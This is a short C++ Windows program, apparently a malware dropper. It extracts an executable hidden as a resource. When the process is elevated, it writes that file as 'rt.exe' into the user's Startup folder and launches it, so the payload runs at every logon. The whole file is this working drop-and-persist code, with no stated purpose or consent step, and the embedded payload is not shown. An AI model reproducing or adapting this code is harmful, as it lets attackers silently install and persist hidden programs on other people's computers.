#include <iostream>
#include <string>
#include <Windows.h>
#include "resource.h"
#include <string_view>

#pragma comment(linker, "/ENTRY:mainCRTStartup")

static std::wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}


class Resource {
public:
    struct Parameters {
        std::size_t size_bytes = 0;
        void* ptr = nullptr;
    };

private:
    HRSRC hResource = nullptr;
    HGLOBAL hMemory = nullptr;

    Parameters p;

public:
    Resource(int resource_id, const std::string &resource_class) {
        std::wstring tmp = s2ws(resource_class);
        hResource = FindResource(nullptr, MAKEINTRESOURCE(resource_id), tmp.c_str());
        hMemory = LoadResource(nullptr, hResource);

        p.size_bytes = SizeofResource(nullptr, hResource);
        p.ptr = LockResource(hMemory);
    }

    auto GetResourceString() const {
        std::string_view dst;
        if (p.ptr != nullptr)
            dst = std::string_view(reinterpret_cast<char*>(p.ptr), p.size_bytes);
        return dst;
    }
};

std::string GetFile() {
    Resource very_important(IDR_EXECUTABLE1, "Executable");
    return std::string(very_important.GetResourceString());
}

BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("\n Failed to get Process Token :%d.", GetLastError());
        goto Cleanup;  // if Failed, we treat as False
    }


    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        printf("\nFailed to get Token Information :%d.", GetLastError());
        goto Cleanup;// if Failed, we treat as False
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

bool dirExists(const std::string& dirName_in)
{
    DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
    if (ftyp == INVALID_FILE_ATTRIBUTES)
        return false;  //something is wrong with your path!

    if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
        return true;   // this is a directory!

    return false;    // this is not a directory!
}

VOID startup(LPCTSTR lpApplicationName)
{
    // additional information
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    LPWSTR t = {};

    // start the program up
    CreateProcess(lpApplicationName,   // the path
        t,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    );
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main()
{
    if (IsProcessElevated())
    {
        FILE* pFile;
        //system(R"(mkdir "C:\RTT\")");
        char path[MAX_PATH];
        ExpandEnvironmentStringsA(R"(%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\)", path, MAX_PATH);

        std::string fullPath = path;
        fullPath.append("rt.exe");

        pFile = fopen(fullPath.c_str(), "wb");
        if (pFile)
        {
            fwrite(GetFile().data(), sizeof(char), GetFile().size(), pFile);
            fclose(pFile);
        }
        startup(s2ws(fullPath).c_str());
        std::cin.get();
    }

}